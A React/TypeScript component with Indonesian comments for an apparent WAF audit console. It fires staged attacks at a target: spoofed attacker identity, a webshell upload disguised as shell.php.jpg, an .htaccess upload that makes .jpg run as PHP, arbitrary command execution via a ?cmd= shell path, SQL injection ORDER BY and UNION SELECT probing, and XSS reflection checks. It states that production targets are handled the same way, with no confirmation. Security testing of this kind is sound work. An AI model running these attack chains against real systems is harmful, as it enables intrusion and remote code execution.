import { useEffect, useState } from "react";
import { TooltipProvider } from "@/components/ui/tooltip";
import { VULN_INFO, type ChainStep } from "@/lib/vulnInfo";
import type { NoPasakRecommendation } from "@/lib/noPasak";
import type { ProxyResult, SendRawFn } from "@/hooks/useWafConsole";
import { noPasakRecommendations, noPasakStages } from "@/lib/noPasak";
import { labBrowserUa, useLabStore } from "@/stores/lab";
import {
    MethodSheet,
    type BusyState,
    type ChainRun,
    type MethodRun,
    type SheetMethodState,
} from "./sheet";
import {
    ActiveStageHeader,
    AttackerCard,
    ConfigStepperCard,
    DEMO_LOCAL_IP,
    gradeVector,
    isPassed,
    LivePreviewCard,
    PreviewSplit,
    RecommendationCard,
    type ExecResult,
    type FileCheck,
    type NoPasakTabProps,
} from "./nopasak";

export default function NoPasakTab({
    sendRaw,
    target,
    onTargetChange,
    mode = "local",
}: NoPasakTabProps) {
    const [results, setResults] = useState<Record<number, ProxyResult>>({});
    const [busy, setBusy] = useState<BusyState>(null);
    const [proved, setProved] = useState<Record<number, boolean>>({});
    const [activeStage, setActiveStage] = useState(1);
    const [fileCheck, setFileCheck] = useState<FileCheck | null>(null);

    // Identitas lab dari Zustand: URL target + IP penyerang + ID perangkat.
    const attackerIp = useLabStore((s) => s.attackerIp);
    const deviceId = useLabStore((s) => s.deviceId);
    const browser = useLabStore((s) => s.browser);
    const storedTarget = useLabStore((s) => s.target);
    const storeTarget = useLabStore((s) => s.setTarget);

    // Benihkan target store dari form konsol bila store masih kosong.
    useEffect(() => {
        if (storedTarget === "" && target !== "") {
            storeTarget(target);
        }
        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, []);

    /** Semua kiriman audit membawa identitas penyerang + perangkat yang sama. */
    const sendAsAttacker = (
        override: Parameters<SendRawFn>[0] = {},
    ): ReturnType<SendRawFn> => {
        const o = override ?? {};
        return sendRaw({
            ...o,
            userAgent:
                o.userAgent !== undefined && o.userAgent.trim() !== ""
                    ? o.userAgent
                    : labBrowserUa(browser),
            ip: attackerIp.trim(),
            deviceId,
            localIp: DEMO_LOCAL_IP,
        });
    };

    const [previewPage, setPreviewPage] = useState("/");
    const [previewTick, setPreviewTick] = useState(0);
    const [waived, setWaived] = useState<Record<number, string>>({});
    const [copiedIdx, setCopiedIdx] = useState<number | null>(null);
    const [execCmd, setExecCmd] = useState("id");
    const [execResult, setExecResult] = useState<ExecResult | null>(null);
    const [methodRuns, setMethodRuns] = useState<Record<string, MethodRun>>({});
    const [sheetOpen, setSheetOpen] = useState(false);
    const [sheetMethod, setSheetMethod] = useState<SheetMethodState | null>(
        null,
    );
    const [sheetRun, setSheetRun] = useState<MethodRun | null>(null);
    const [chainRuns, setChainRuns] = useState<Record<string, ChainRun>>({});

    /**
     * Mode lokal vs produksi hanya membedakan target pengujian
     * (lokal = http://localhost:8000, produksi = https://...).
     * Seluruh alur pengujian — termasuk verifikasi webshell tahap 4 dan
     * eksekusi RCE (/shell) — berperilaku sama di kedua mode.
     */
    const askProd = (label: string, run: () => void): void => {
        void label;
        run();
    };

    const url = storedTarget || target || "http://localhost:8000";
    const baseUrl = url.replace(/\/+$/, "");
    const previewUrl = `${baseUrl}${previewPage.startsWith("/") ? previewPage : `/${previewPage}`}`;
    // Preview korban dilewatkan proxy agar memakai IP penyerang.
    const previewSrc = `/api/preview-victim?target=${encodeURIComponent(baseUrl)}&page=${encodeURIComponent(previewPage)}&ip=${encodeURIComponent(attackerIp.trim())}&device=${encodeURIComponent(deviceId)}&localip=${encodeURIComponent(DEMO_LOCAL_IP)}&t=${previewTick}`;

    const itemsOf = (
        stageId: number,
    ): Array<{ item: NoPasakRecommendation; index: number }> =>
        noPasakRecommendations
            .map((item, index) => ({ item, index }))
            .filter(({ item }) => item.stage === stageId);

    const fire = async (
        item: NoPasakRecommendation,
        index: number,
    ): Promise<ProxyResult> => {
        setBusy(index);
        const res = await sendAsAttacker({
            target: url,
            path: item.path,
            method: item.method,
            ip: attackerIp.trim(),
            userAgent: item.userAgent ?? "",
            upload: item.upload ?? null,
        });
        setResults((prev) => ({ ...prev, [index]: res }));
        setBusy(null);
        setPreviewTick((n) => n + 1);
        return res;
    };

    const fireStage = async (stageId: number): Promise<void> => {
        for (const { item, index } of itemsOf(stageId)) {
            // eslint-disable-next-line no-await-in-loop
            await fire(item, index);
        }
    };

    const stagePassed = (stageId: number): boolean => {
        const entries = itemsOf(stageId);
        return (
            entries.length > 0 &&
            entries.every(({ index }) => isPassed(results[index]))
        );
    };

    const unlocked = (stageId: number): boolean =>
        stageId === 1 ||
        stagePassed(stageId - 1) ||
        waived[stageId - 1] !== undefined;

    /** Tahap 4: buktikan file webshell benar-benar bisa diakses publik (semua mode). */
    const verifyUploadedFile = async (uploadIndex: number): Promise<void> => {
        setBusy(`verify-${uploadIndex}`);
        try {
            const uploadRes = results[uploadIndex];
            let fileUrl = "/storage/demo-uploads/shell.php.jpg";
            try {
                const parsed = JSON.parse(uploadRes?.body ?? "");
                if (parsed.url) {
                    fileUrl = parsed.url;
                }
            } catch {
                // Pakai path bawaan bila body bukan JSON.
            }
            const res = await sendAsAttacker({
                target: url,
                path: fileUrl,
                method: "GET",
                ip: attackerIp.trim(),
            });
            const ok =
                res?.success === true && (res.body ?? "").includes("system(");
            setFileCheck({
                fileUrl,
                status: res?.status,
                ok,
                snippet: (res?.body ?? "").slice(0, 200),
            });
        } finally {
            setBusy(null);
        }
    };

    /** Tahap 4 (lanjutan): manfaatkan webshell — jalankan perintah via /shell. */
    const exploitShellWith = async (
        uploadIndex: number,
        rawCmd: string,
    ): Promise<{ ok: boolean; output: string; status?: number }> => {
        setBusy(`exec-${uploadIndex}`);
        try {
            const cmd = (rawCmd.trim() || "id").slice(0, 500);
            const res = await sendAsAttacker({
                target: url,
                path: `/shell/shell.php.jpg?cmd=${encodeURIComponent(cmd)}`,
                method: "GET",
                ip: attackerIp.trim(),
            });
            let output = res?.body ?? "";
            try {
                const parsed = JSON.parse(output);
                if (parsed.output !== undefined) {
                    output = parsed.output;
                }
            } catch {
                // Biarkan body mentah bila bukan JSON.
            }
            const done = {
                cmd,
                status: res?.status,
                ok: res?.success === true && output.trim() !== "",
                output: output.slice(0, 1000),
            };
            setExecResult(done);
            return done;
        } finally {
            setBusy(null);
        }
    };

    const exploitShell = (
        uploadIndex: number,
    ): Promise<{ ok: boolean; output: string; status?: number }> =>
        exploitShellWith(uploadIndex, execCmd);

    /** Jalankan satu langkah rantai eskalasi dari Sheet (sama di semua mode). */
    const runChainStep = (step: ChainStep): void => {
        if (busy !== null) {
            return;
        }
        askProd(`Langkah rantai "${step.label}"`, () =>
            execChainStep(step).catch((error: unknown) => {
                const message =
                    error instanceof Error ? error.message : String(error);
                setChainRuns((prev) => ({
                    ...prev,
                    [step.label]: {
                        status: undefined,
                        ok: false,
                        note: `gagal: ${message}`,
                    },
                }));
            }),
        );
    };

    const execChainStep = async (step: ChainStep): Promise<void> => {
        setBusy(`chain-${step.label}`);
        const fail = (note: string) =>
            setChainRuns((prev) => ({
                ...prev,
                [step.label]: { status: undefined, ok: false, note },
            }));
        try {
            const sendStep = (path: string) =>
                sendAsAttacker({
                    target: url,
                    path,
                    method: step.method ?? "GET",
                    ip: attackerIp.trim(),
                });
            const bodyOf = (res: Awaited<ReturnType<typeof sendStep>>) =>
                typeof res.body === "string"
                    ? res.body
                    : JSON.stringify(res.body ?? "");
            const metaOf = (res: Awaited<ReturnType<typeof sendStep>>) =>
                `· ${res.size ?? "?"} B · ${res.duration_ms ?? "?"} ms`;

            // Mode sapu: kirim N request, simpulkan angka pasti dari batas valid/error.
            if (step.probe !== undefined) {
                const probe = step.probe;
                const rows: string[] = [];
                let lastGood = probe.from - 1;
                let sawError = false;
                for (let n = probe.from; n <= probe.to; n++) {
                    const res = await sendStep(
                        probe.template.replaceAll("{n}", String(n)),
                    );
                    if (res.success !== true) {
                        fail(`gagal di ORDER BY ${n}: ${res.message ?? ""}`);
                        return;
                    }
                    const hit =
                        res.status !== 403 &&
                        res.status !== 429 &&
                        bodyOf(res).includes(probe.successExpect);
                    if (hit) {
                        lastGood = n;
                    } else {
                        sawError = true;
                    }
                    rows.push(
                        `ORDER BY ${n}: HTTP ${res.status}${hit ? " ✅ normal" : " ❌ error/ditolak"} ${metaOf(res)}`,
                    );
                }
                const found =
                    sawError && lastGood >= probe.from && lastGood < probe.to;
                const summary = found
                    ? (probe.foundSummary ?? "").replaceAll(
                          "{n}",
                          String(lastGood),
                      )
                    : `batas tak ketemu di ${probe.from}–${probe.to} (semua ${sawError ? "error" : "normal"}) — perlebar rentang atau target tak rentan ORDER BY.`;
                const nulls =
                    found && probe.foundSummary !== undefined
                        ? `\nSalin: /?id=-1 UNION SELECT ${Array.from({ length: lastGood }, () => "NULL").join(",")}-- -`
                        : "";
                setChainRuns((prev) => ({
                    ...prev,
                    [step.label]: {
                        status: undefined,
                        ok: found,
                        note: `${found ? `✅ JUMLAH KOLOM = ${lastGood}\n` : "→ "}${rows.join("\n")}\n${summary}${nulls}`,
                        next: step.next,
                    },
                }));
                return;
            }

            const res = await sendStep(step.path);
            const body = bodyOf(res);
            const hit = body.includes(step.expect);
            const ms = res.duration_ms ?? 0;
            const delayProven =
                step.timingMs !== undefined && ms >= step.timingMs;
            const evidenceLine = hit
                ? (
                      body
                          .split("\n")
                          .find((line) => line.includes(step.expect)) ?? ""
                  )
                      .trim()
                      .slice(0, 160)
                : "";
            const reflectRows = (step.reflect ?? []).map((token) => {
                if (body.includes(token)) {
                    return `${token} → MENTAH ✅ (tereksekusi di browser)`;
                }
                const encoded = token
                    .replaceAll("&", "&amp;")
                    .replaceAll("<", "&lt;")
                    .replaceAll(">", "&gt;")
                    .replaceAll('"', "&quot;");
                if (encoded !== token && body.includes(encoded)) {
                    return `${token} → TER-ENCODE ⚠️ (aman, tak tereksekusi)`;
                }
                return `${token} → HILANG ❌ (difilter/dihapus)`;
            });
            let evalVerdict = "";
            if (step.evalCheck !== undefined) {
                const hasValue = body.includes(step.evalCheck.value);
                const hasRaw = body.includes(step.evalCheck.raw);
                evalVerdict =
                    hasValue && !hasRaw
                        ? `🧮 TEREVALUASI ✅ ("${step.evalCheck.value}" ada, sintaks mentah hilang)`
                        : hasValue
                          ? `🧮 tercermin mentah — nilai ikut gema, belum bukti evaluasi`
                          : `🧮 tak ada hasil evaluasi`;
            }
            const ok =
                res.success === true &&
                res.status !== 403 &&
                res.status !== 429 &&
                (hit || delayProven);
            const verdict = delayProven
                ? `⏱️ DELAY ${ms} ms ≥ ${step.timingMs} ms — SLEEP dieksekusi, injeksi buta TERBUKTI ✅`
                : hit
                  ? `tanda "${step.expect}" DITEMUKAN ✅`
                  : `tanda "${step.expect}" tak ada, lanjutkan langkah berikut`;
            const details = [
                evidenceLine !== "" ? `🔎 cuplikan: ${evidenceLine}` : "",
                ...reflectRows,
                evalVerdict,
            ].filter((line) => line !== "");
            setChainRuns((prev) => ({
                ...prev,
                [step.label]: {
                    status: res.status,
                    ok,
                    note:
                        res.success !== true
                            ? `gagal: ${res.message ?? ""}`
                            : `HTTP ${res.status} ${metaOf(res)} — ${verdict}${details.length > 0 ? `\n${details.join("\n")}` : ""}`,
                    next: step.next,
                },
            }));
        } catch (error) {
            const message =
                error instanceof Error ? error.message : String(error);
            fail(`gagal: ${message}`);
        } finally {
            setBusy(null);
        }
    };

    /** Uji langsung payload lanjutan dari kotak "AKSI UJI BERIKUTNYA". */
    const testChainPayload = (path: string): void => {
        if (busy !== null) {
            return;
        }
        askProd(
            `Uji payload "${path.slice(0, 80)}"`,
            () => void execTestPayload(path),
        );
    };

    const execTestPayload = async (path: string): Promise<void> => {
        setBusy("test-payload");
        const record = (run: MethodRun): void => {
            setSheetRun(run);
            requestAnimationFrame(() => {
                document
                    .getElementById("method-result")
                    ?.scrollIntoView({ behavior: "smooth", block: "start" });
            });
        };
        try {
            const res = await sendAsAttacker({
                target: url,
                path,
                method: "GET",
                ip: attackerIp.trim(),
            });
            const grade = gradeVector(res, path);
            record({
                label: "Uji payload lanjutan",
                status: res.status,
                ok: grade !== "blocked",
                grade,
                output:
                    grade === "blocked"
                        ? `→ GET ${path}\n→ HTTP ${res.status} — DITOLAK di gerbang.`
                        : grade === "proven"
                          ? `→ GET ${path}\n→ HTTP ${res.status} — TERBUKTI, jejak payload ditemukan di body.`
                          : `→ GET ${path}\n→ HTTP ${res.status} — tak diblokir, tapi TANPA bukti eksploitasi. Coba varian lain.`,
                json: JSON.stringify(
                    {
                        aksi: "uji payload lanjutan",
                        request: `GET ${path}`,
                        status: res.status,
                        grade,
                        ms: res.duration_ms,
                        body: (res.body ?? "").slice(0, 300),
                    },
                    null,
                    2,
                ),
            });
        } catch (error) {
            const message =
                error instanceof Error ? error.message : String(error);
            record({
                label: "Uji payload lanjutan",
                status: undefined,
                ok: false,
                grade: "blocked",
                output: `→ GET ${path}\n→ GAGAL terkirim: ${message} (pastikan target + pnpm dev berjalan).`,
                json: JSON.stringify(
                    {
                        aksi: "uji payload lanjutan",
                        request: `GET ${path}`,
                        error: message,
                    },
                    null,
                    2,
                ),
            });
        } finally {
            setBusy(null);
        }
    };

    /** Eksekusi nyata tiap metode hacker (sama di semua mode). */
    const runMethod = async (
        cardIndex: number,
        item: NoPasakRecommendation,
        mi: number,
    ): Promise<void> => {
        const m = VULN_INFO[item.label]?.methods[mi];
        if (!m?.exec) {
            return;
        }
        const key = `${cardIndex}:${mi}`;
        const exec = m.exec;
        const requestLine =
            exec.kind === "vector"
                ? `${exec.method ?? "GET"} ${exec.path}${exec.userAgent ? `  (UA: ${exec.userAgent.slice(0, 60)})` : ""}${exec.payload ? `  body: ${exec.payload.slice(0, 80)}` : ""}`
                : exec.kind === "reupload"
                  ? `POST /upload (file ${item.label})`
                  : exec.kind === "htaccess"
                    ? "POST /upload (file .htaccess)"
                    : `GET /shell/shell.php.jpg?cmd=${exec.cmd}`;

        setSheetMethod({
            title: m.title,
            desc: m.desc,
            request: requestLine,
            vuln: item.label,
        });
        setSheetRun(null);
        setSheetOpen(true);
        setBusy(`method-${key}`);

        const record = (run: MethodRun): void => {
            setMethodRuns((prev) => ({ ...prev, [key]: run }));
            setSheetRun(run);
        };

        try {
            if (exec.kind === "vector") {
                const res = await sendAsAttacker({
                    target: url,
                    path: exec.path,
                    method: exec.method ?? "GET",
                    ip: attackerIp.trim(),
                    userAgent: exec.userAgent ?? "",
                    payload: exec.payload ?? "",
                });
                const grade = gradeVector(res, exec.path);
                record({
                    label: m.title,
                    status: res.status,
                    ok: grade !== "blocked",
                    grade,
                    output:
                        grade === "blocked"
                            ? `→ HTTP ${res.status} — DITOLAK di gerbang.`
                            : grade === "proven"
                              ? `→ HTTP ${res.status} — TERBUKTI, jejak payload ditemukan di body. Tujuan tercapai.`
                              : `→ HTTP ${res.status} — tak diblokir, tapi TANPA bukti eksploitasi (mis. 404 route tak ada). Lanjutkan rantai.`,
                    json: JSON.stringify(
                        {
                            metode: m.title,
                            request: requestLine,
                            status: res.status,
                            grade,
                            body: (res.body ?? "").slice(0, 300),
                        },
                        null,
                        2,
                    ),
                });
            } else if (exec.kind === "reupload") {
                const res = await fire(item, cardIndex);
                const received = (res.body ?? "").includes('"ok":true');
                record({
                    label: m.title,
                    status: res.status,
                    ok: isPassed(res),
                    grade: received
                        ? "proven"
                        : isPassed(res)
                          ? "passed"
                          : "blocked",
                    output:
                        `Upload ulang → HTTP ${res.status} ` +
                        (received
                            ? "(file DITERIMA server ✅)."
                            : isPassed(res)
                              ? "(tak ditolak, tapi rute /upload tak ada / file tak diterima — bukan bukti lolos)."
                              : "(tertahan ⛔)."),
                    json: JSON.stringify(
                        {
                            metode: m.title,
                            status: res.status,
                            body: (res.body ?? "").slice(0, 300),
                        },
                        null,
                        2,
                    ),
                });
            } else if (exec.kind === "htaccess") {
                const res = await sendAsAttacker({
                    target: url,
                    path: "/upload",
                    method: "POST",
                    ip: attackerIp.trim(),
                    upload: {
                        field: "file",
                        filename: ".htaccess",
                        content_type: "text/plain",
                        content: "AddType application/x-httpd-php .jpg",
                    },
                });
                record({
                    label: m.title,
                    status: res.status,
                    ok:
                        res.success === true &&
                        res.status !== 403 &&
                        res.status !== 429,
                    grade: (res.body ?? "").includes('"ok":true')
                        ? "proven"
                        : res.success === true &&
                            res.status !== 403 &&
                            res.status !== 429
                          ? "passed"
                          : "blocked",
                    output:
                        `Upload .htaccess → HTTP ${res.status}. ` +
                        ((res.body ?? "").includes('"ok":true')
                            ? "File DITERIMA — kini shell.php.jpg dieksekusi sebagai PHP ✅."
                            : "File TAK diterima (rute /upload tak ada / ditolak) — klaim eksekusi di atas tidak berlaku."),
                    json: JSON.stringify(
                        {
                            metode: m.title,
                            status: res.status,
                            body: (res.body ?? "").slice(0, 300),
                        },
                        null,
                        2,
                    ),
                });
            } else if (exec.kind === "rce") {
                if (!fileCheck?.ok) {
                    record({
                        label: m.title,
                        ok: false,
                        grade: "blocked",
                        output: "Verifikasi file dulu (tombol 🔍) agar RCE bisa dijalankan.",
                        json: JSON.stringify(
                            { metode: m.title, hasil: "butuh verifikasi file" },
                            null,
                            2,
                        ),
                    });
                    return;
                }
                const done = await exploitShellWith(cardIndex, exec.cmd);
                record({
                    label: m.title,
                    status: done.status,
                    ok: done.ok,
                    grade: done.ok ? "proven" : "blocked",
                    output: `$ ${exec.cmd}\n${done.output.slice(0, 500)}`,
                    json: JSON.stringify(
                        {
                            metode: m.title,
                            cmd: exec.cmd,
                            output: done.output.slice(0, 500),
                        },
                        null,
                        2,
                    ),
                });
            }
        } finally {
            setBusy(null);
        }
    };

    const total = noPasakRecommendations.length;
    const done = Object.keys(results).length;
    const passedCount = Object.values(results).filter(isPassed).length;
    const allPassed = passedCount === total && done >= total;
    const pct = Math.round((passedCount / total) * 100);

    /** Susun laporan internal JSON: mana yang LOLOS vs AMAN dari semua pengujian. */
    const buildReport = () => {
        const semuaSerangan = noPasakRecommendations.map((item, index) => {
            const res = results[index];
            const grade =
                res === undefined ? null : gradeVector(res, item.path);
            const hasil =
                res === undefined
                    ? "belum_diuji"
                    : res.success !== true
                      ? "gagal_kirim"
                      : grade === "blocked"
                        ? "aman_diblokir"
                        : grade === "proven"
                          ? "LOLOS_TERBUKTI"
                          : "lolos_tanpa_bukti";
            return {
                tahap: item.stage,
                serangan: item.label,
                request: `${item.method} ${item.path}`,
                status: res?.status ?? null,
                durasi_ms: res?.duration_ms ?? null,
                hasil,
                bukti: (res?.success === true
                    ? (res.body ?? "")
                    : (res?.message ?? "belum diuji")
                )
                    .replace(/\s+/g, " ")
                    .slice(0, 200),
            };
        });
        const lolos = semuaSerangan.filter(
            (a) =>
                a.hasil === "LOLOS_TERBUKTI" || a.hasil === "lolos_tanpa_bukti",
        );
        const terbukti = semuaSerangan.filter(
            (a) => a.hasil === "LOLOS_TERBUKTI",
        );
        const aman = semuaSerangan.filter((a) => a.hasil === "aman_diblokir");
        const belum = semuaSerangan.filter(
            (a) => a.hasil === "belum_diuji" || a.hasil === "gagal_kirim",
        );
        const vonis =
            lolos.length === total && fileCheck?.ok
                ? "JEBOL TOTAL (webshell aktif)"
                : lolos.length === total
                  ? "LOLOS SEMUA (verifikasi akhir tertunda)"
                  : lolos.length > 0
                    ? "SEBAGIAN LOLOS"
                    : aman.length === total
                      ? "AMAN (semua ditolak)"
                      : "BELUM LENGKAP";
        return {
            judul: "Laporan internal audit Tanpa-Pasak",
            target: url,
            mode,
            waktu: new Date().toISOString(),
            ringkasan: {
                total_serangan: total,
                lolos: lolos.length,
                terbukti: terbukti.length,
                aman_diblokir: aman.length,
                belum_diuji: belum.length,
                persen_lolos: pct,
                vonis,
            },
            daftar_lolos: lolos,
            daftar_aman: aman,
            semua_serangan: semuaSerangan,
            metode_hacker: Object.values(methodRuns).map((run) => ({
                metode: run.label,
                status: run.status ?? null,
                grade: run.grade,
                ringkasan: run.output.slice(0, 200),
            })),
            rantai_eskalasi: Object.entries(chainRuns).map(
                ([langkah, run]) => ({
                    langkah,
                    berhasil: run.ok,
                    catatan: run.note,
                    aksi_lanjut: run.next ?? null,
                }),
            ),
            webshell: fileCheck
                ? {
                      file: fileCheck.fileUrl,
                      status: fileCheck.status,
                      aktif: fileCheck.ok,
                  }
                : null,
            rce: execResult
                ? {
                      perintah: execResult.cmd,
                      status: execResult.status ?? null,
                      berhasil: execResult.ok,
                  }
                : null,
            pengecualian_tahap: waived,
        };
    };

    /** Unduh laporan internal sebagai berkas .json. */
    const downloadReport = (): void => {
        const blob = new Blob([JSON.stringify(buildReport(), null, 2)], {
            type: "application/json",
        });
        const stamp = new Date()
            .toISOString()
            .slice(0, 16)
            .replace(/[-:T]/g, "");
        const a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = `laporan-nopasak-${stamp}.json`;
        document.body.appendChild(a);
        a.click();
        a.remove();
        window.setTimeout(() => URL.revokeObjectURL(a.href), 1000);
    };

    /** Salin JSON hasil pengujian ke clipboard. */
    const copyJson = async (index: number, text: string): Promise<void> => {
        try {
            await navigator.clipboard.writeText(text);
        } catch {
            const area = document.createElement("textarea");
            area.value = text;
            document.body.appendChild(area);
            area.select();
            document.execCommand("copy");
            document.body.removeChild(area);
        }
        setCopiedIdx(index);
        setTimeout(
            () => setCopiedIdx((prev) => (prev === index ? null : prev)),
            1500,
        );
    };

    const activeStageEntry = noPasakStages.find(
        (stage) => stage.id === activeStage,
    );
    const stage4UploadEntry = itemsOf(4).find(
        ({ item }) => item.label === "Upload shell.php.jpg",
    );
    const stage4UploadIdx = stage4UploadEntry?.index;
    const showAttackerCard =
        activeStage === 4 &&
        stage4UploadIdx !== undefined &&
        isPassed(results[stage4UploadIdx]) &&
        fileCheck?.ok;

    return (
        <TooltipProvider>
            <PreviewSplit
                left={
                    <div className="@container flex min-w-0 flex-col gap-4">
                        <ConfigStepperCard
                            url={url}
                            mode={mode}
                            target={target}
                            onTargetChange={onTargetChange}
                            activeStage={activeStage}
                            onSelectStage={setActiveStage}
                            stages={noPasakStages}
                            isStagePassed={stagePassed}
                            isStageUnlocked={unlocked}
                            waived={waived}
                            doneCount={done}
                            totalCount={total}
                            passedCount={passedCount}
                            pct={pct}
                            allPassed={allPassed}
                            fileCheck={fileCheck}
                            busy={busy}
                            copiedIdx={copiedIdx}
                            onCopyReportJson={() =>
                                copyJson(
                                    -2,
                                    JSON.stringify(buildReport(), null, 2),
                                )
                            }
                            onDownloadReport={downloadReport}
                            reportJson={JSON.stringify(buildReport(), null, 2)}
                        />

                        {activeStageEntry && (
                            <section className="flex flex-col gap-4">
                                <ActiveStageHeader
                                    stage={activeStageEntry}
                                    busy={busy}
                                    onFireStage={() =>
                                        fireStage(activeStageEntry.id)
                                    }
                                    isPassed={stagePassed(activeStageEntry.id)}
                                    canAdvance={activeStageEntry.id < 4}
                                    onAdvance={() =>
                                        setActiveStage(activeStageEntry.id + 1)
                                    }
                                    canWaive={itemsOf(activeStageEntry.id).some(
                                        ({ index }) =>
                                            results[index] !== undefined,
                                    )}
                                    waiverNote={waived[activeStageEntry.id]}
                                    onWaive={(note) =>
                                        setWaived((prev) => ({
                                            ...prev,
                                            [activeStageEntry.id]: note,
                                        }))
                                    }
                                />

                                <div className="grid gap-4 @2xl:grid-cols-2">
                                    {itemsOf(activeStageEntry.id).map(
                                        ({ item, index: i }) => (
                                            <RecommendationCard
                                                key={item.label}
                                                item={item}
                                                index={i}
                                                res={results[i]}
                                                busy={busy}
                                                proved={Boolean(proved[i])}
                                                onToggleProved={() =>
                                                    setProved((prev) => ({
                                                        ...prev,
                                                        [i]: !prev[i],
                                                    }))
                                                }
                                                onFire={() => fire(item, i)}
                                                onVerifyUpload={() =>
                                                    verifyUploadedFile(i)
                                                }
                                                onRunMethod={(mi) =>
                                                    runMethod(i, item, mi)
                                                }
                                                methodRuns={methodRuns}
                                                copiedIdx={copiedIdx}
                                                onCopyJson={copyJson}
                                                mode={mode}
                                                url={url}
                                                fileCheck={fileCheck}
                                            />
                                        ),
                                    )}

                                    {showAttackerCard && (
                                        <AttackerCard
                                            uploadIdx={stage4UploadIdx}
                                            execCmd={execCmd}
                                            onExecCmdChange={setExecCmd}
                                            execResult={execResult}
                                            busy={busy}
                                            onExploitShell={exploitShell}
                                            onExploitShellWith={
                                                exploitShellWith
                                            }
                                        />
                                    )}
                                </div>
                            </section>
                        )}
                    </div>
                }
                right={
                    <aside className="@container min-w-0 lg:sticky lg:top-4">
                        <LivePreviewCard
                            previewUrl={previewUrl}
                            previewSrc={previewSrc}
                            previewPage={previewPage}
                            previewTick={previewTick}
                            onPageChange={(page) => {
                                setPreviewPage(page);
                                setPreviewTick((n) => n + 1);
                            }}
                            onRefresh={() => setPreviewTick((n) => n + 1)}
                            sendRaw={sendAsAttacker}
                            attackerIp={attackerIp}
                            browser={browser}
                            deviceId={deviceId}
                            busy={busy}
                            target={url}
                        />
                    </aside>
                }
            />

            <MethodSheet
                open={sheetOpen}
                onOpenChange={setSheetOpen}
                method={sheetMethod}
                run={sheetRun}
                chainRuns={chainRuns}
                busy={busy}
                url={url}
                copiedIdx={copiedIdx}
                onCopyJson={copyJson}
                onRunChainStep={runChainStep}
                onTestPayload={testChainPayload}
            />
        </TooltipProvider>
    );
}
